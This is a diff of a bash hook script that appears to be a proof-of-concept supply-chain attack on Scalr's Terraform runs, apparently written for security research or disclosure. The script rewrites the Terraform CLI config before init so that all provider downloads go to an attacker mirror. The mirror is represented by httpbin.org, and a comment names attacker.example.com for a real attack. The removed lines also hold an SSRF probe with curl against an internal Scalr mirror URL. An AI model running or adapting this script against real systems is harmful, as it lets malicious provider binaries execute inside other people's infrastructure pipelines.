@@ -1,32 +1,20 @@
 #!/usr/bin/env bash
-# SUPPLY CHAIN DEMO
-# Shows: hook runs before terraform init → hook can redirect provider downloads to attacker server
+# PRE-INIT HOOK: runs before Terraform initializes plugins
+# Goal: redirect provider downloads to attacker-controlled server
 
-MIRROR="https://internal.main.scalr.dev/terraform-mirror"
-
-echo "=== SSRF: confirm redirect vector still works ==="
-curl -sk --no-location --path-as-is -D - \
-  "$MIRROR/https%3A%2F%2Fhttpbin.org%2Fanything" 2>/dev/null \
-  | grep -E "^HTTP/|^[Ll]ocation:" | head -2
+echo "=== PRE-INIT: TF_CLI_CONFIG_FILE location ==="
+echo "TF_CLI_CONFIG_FILE: ${TF_CLI_CONFIG_FILE}"
+echo "Current contents:"
+cat "${TF_CLI_CONFIG_FILE}" 2>/dev/null || echo "(file not yet written by Scalr)"
 
 echo ""
-echo "=== RUN ENVIRONMENT: what terraform sees ==="
-echo "TF_CLI_CONFIG_FILE: ${TF_CLI_CONFIG_FILE:-not set}"
-echo "HOME: $HOME"
-echo "USER: $(whoami)"
-echo "existing ~/.terraformrc: $([ -f ~/.terraformrc ] && cat ~/.terraformrc || echo 'not present')"
-echo "existing TF_PLUGIN_CACHE_DIR: ${TF_PLUGIN_CACHE_DIR:-not set}"
-echo "TERRAFORM_CONFIG env: ${TERRAFORM_CONFIG:-not set}"
-
-echo ""
-echo "=== SUPPLY CHAIN: overwrite .terraformrc with attacker mirror BEFORE terraform init ==="
-# Pre-plan hook runs before terraform init.
-# Writing ~/.terraformrc here redirects ALL provider downloads to attacker server.
-# httpbin.org stands in for attacker's provider mirror.
-cat > ~/.terraformrc << 'TFRC'
+echo "=== PRE-INIT: overwrite with attacker mirror ==="
+# httpbin.org/anything/ is the stand-in for attacker's provider mirror server
+# In a real attack: replace with https://attacker.example.com/providers/
+cat > "${TF_CLI_CONFIG_FILE}" << 'TFRC'
 provider_installation {
   network_mirror {
-    url = "https://httpbin.org/anything/providers/"
+    url     = "https://httpbin.org/anything/"
     include = ["registry.terraform.io/*/*"]
   }
   direct {
@@ -35,11 +23,8 @@ provider_installation {
 }
 TFRC
 
-echo "wrote ~/.terraformrc:"
-cat ~/.terraformrc
-
+echo "Wrote attacker mirror to TF_CLI_CONFIG_FILE:"
+cat "${TF_CLI_CONFIG_FILE}"
 echo ""
-echo "Terraform init will now request providers from httpbin.org/anything/providers/"
-echo "(In real attack: replace httpbin.org with attacker-controlled mirror serving malicious binaries)"
-echo ""
-echo "Pre-plan hook done — terraform init starts next, watch for provider download in plan log"
+echo "Terraform will now try to download hashicorp/null from httpbin.org/anything/"
+echo "(Watch next log section for provider download attempt to attacker server)"
